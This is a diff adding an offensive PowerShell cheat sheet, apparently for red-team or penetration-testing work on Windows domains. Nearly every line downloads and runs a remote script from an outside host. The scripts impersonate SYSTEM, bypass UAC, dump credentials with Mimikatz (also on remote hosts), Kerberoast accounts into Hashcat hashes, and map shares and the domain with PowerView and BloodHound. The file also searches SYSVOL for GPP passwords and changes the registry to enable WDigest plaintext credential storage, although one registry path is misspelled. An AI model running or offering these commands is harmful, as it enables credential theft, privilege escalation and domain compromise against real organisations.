@@ -1,0 +1,56 @@
+powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString('http://h4x.threathunter.ninja/tm.ps1');Invoke-TokenManipulation -Enumerate”
+
+powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString('http://h4x.threathunter.ninja/tm.ps1');Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username 'nt authority\system'”
+
+powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString('http://h4x.threathunter.ninja/tm.ps1');Invoke-TokenManipulation -ImpersonateUser -Username 'nt authority\system'”
+
+powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString('http://h4x.threathunter.ninja/gs.ps1');Get-System”
+
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://h4x.threathunter.ninja/bpuac.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"
+
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://h4x.threathunter.ninja/mk.ps1');Invoke-Mimikatz -DumpCreds"
+
+powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString('http://h4x.threathunter.ninja/iwp.ps1');Invoke-winPEAS”
+
+
+# Import Mimikatz Module to run further commands
+
+powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://h4x.threathunter.ninja/mk.ps1')"
+
+# Invoke-MassMimikatz: Use to dump creds on remote host [replace $env:computername with target server name(s)]
+
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://h4x.threathunter.ninja/mk.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"
+
+# PowerUp: Privilege escalation checks
+
+powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘http://h4x.threathunter.ninja/pu.ps1’);Invoke-AllChecks”
+
+# Invoke-Kerberoast and provide Hashcat compatible hashes
+
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://h4x.threathunter.ninja/kr.ps1');Invoke-kerberoast -OutputFormat Hashcat"
+
+# Invoke-ShareFinder and print output to file
+
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://h4x.threathunter.ninja/pv.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"
+
+# Import PowerView Module to run further commands
+
+powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://h4x.threathunter.ninja/pv.ps1')"
+
+# Invoke-Bloodhound
+
+powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('http://h4x.threathunter.ninja/bh.ps1');Invoke-BloodHound"
+
+# Find GPP Passwords in SYSVOL
+
+findstr /S cpassword $env:logonserver\sysvol\*.xml
+
+findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)
+
+# Run Powershell prompt as a different user, without loading profile to the machine [replace DOMAIN and USER]
+
+runas /user:DOMAIN\USER /noprofile powershell.exe
+
+# Insert reg key to enable Wdigest on newer versions of Windows
+
+reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1
